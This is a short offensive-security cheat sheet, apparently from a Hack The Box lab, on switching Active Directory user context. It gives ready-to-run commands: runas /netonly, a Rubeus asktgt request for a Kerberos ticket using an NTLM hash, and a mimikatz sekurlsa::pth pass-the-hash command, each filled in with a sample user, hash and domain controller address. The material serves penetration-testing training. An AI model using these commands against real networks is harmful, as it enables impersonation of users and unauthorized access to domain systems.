# 02.04 Domain Context Switching runas Rubeus Mimikatz

> Spawn a shell in another user's context with `runas /netonly`, then pass creds or hashes to `Rubeus` / `mimikatz` for ticket ops.

## Overview

When tools lack credential parameters they inherit context from the running session. Use runas /netonly to spawn a shell in another user's context without joining the domain. Rubeus and mimikatz can accept cleartext credentials or NTLM hashes to request tickets or perform pass-the-hash. Opening MMC via runas lets you attach RSAT snap-ins to a foreign domain from a non-domain-joined machine.

## Steps

- Use runas /netonly to open a new PowerShell session in another user's credential context over the network.
- Use rubeus.exe asktgt with /rc4: hash to obtain a Kerberos TGT without knowing the plaintext password.
- Use mimikatz.exe sekurlsa::pth to perform pass-the-hash and spawn an elevated shell.
- Open MMC with runas /netonly then add AD snap-ins and choose "Change Domain" to enumerate a foreign domain.
- Tools like Get-ADUser inherit the current session's context — no credential parameter needed after runas.

## Commands

### runas /netonly — spawn PowerShell as another user

```powershell
runas /netonly /user:htb.local\jackie.may powershell
```

### Rubeus — request TGT with NTLM hash

```powershell
rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
```

### Mimikatz — pass-the-hash

```powershell
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
```

### MMC via runas for foreign domain

```powershell
runas /netonly /user:Domain_Name\Domain_USER mmc
```
